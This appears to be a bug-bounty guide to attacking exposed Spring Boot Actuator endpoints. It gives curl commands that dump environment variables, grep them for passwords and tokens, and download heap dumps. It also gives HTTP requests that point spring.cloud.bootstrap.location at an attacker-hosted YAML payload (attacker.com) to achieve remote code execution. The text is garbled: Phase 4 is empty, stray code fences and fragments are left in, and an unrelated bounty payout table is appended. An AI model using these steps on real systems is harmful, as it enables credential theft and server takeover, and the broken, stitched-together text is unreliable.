# Spring Boot Actuator Abuse

## When to Use
- When auditing Java Spring Boot applications that expose monitoring and management endpoints (commonly `/actuator`).
- To extract sensitive environment variables, hidden credentials, or potentially achieve RCE when Spring Cloud routing is enabled.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Identifying Actuator Endpoints

```bash
# curl -s http://target.com/actuator/ | jq .
curl -s http://target.com/actuator/env | jq .
curl -s http://target.com/actuator/mappings | jq .
```

### Phase 2: Extracting Sensitive Information

```bash
# curl -s http://target.com/actuator/env | grep -i "password\|secret\|key\|token" 

# curl -O http://target.com/actuator/heapdump
jhat heapdump # ```

### Phase 3: RCE via `spring-cloud-starter` (SnakeYAML)

```http
# POST /actuator/env HTTP/1.1
Host: target.com
Content-Type: application/json

{"name":"spring.cloud.bootstrap.location","value":"http://attacker.com/yaml-payload.yml"}

# POST /actuator/refresh HTTP/1.1
Host: target.com
Content-Type: application/json
```

### Phase 4: Exploiting Logstash / Logback Configuration

```bash
# ```

| Company/Platform | Total Paid | Highest Single | Year |
|-----------------|------------|---------------|------|
| **Google VRP** | $17.1M | $250,000 (CVE-2025-4609 Chrome sandbox escape) | 2025 |
| **Microsoft** | $16.6M | (Not disclosed) | 2024 |
| **Google VRP** | $11.8M | $100,115 (Chrome MiraclePtr Bypass) | 2024 |
| **HackerOne (all programs)** | $81M | $100,050 (crypto firm) | 2025 |
| **Meta/Facebook** | $2.3M | up to $300K (mobile code execution) | 2024 |
| **Crypto.com (HackerOne)** | $2M program | $2M max | 2024 |
| **1Password (Bugcrowd)** | $1M max | $1M (highest Bugcrowd ever) | 2024 |
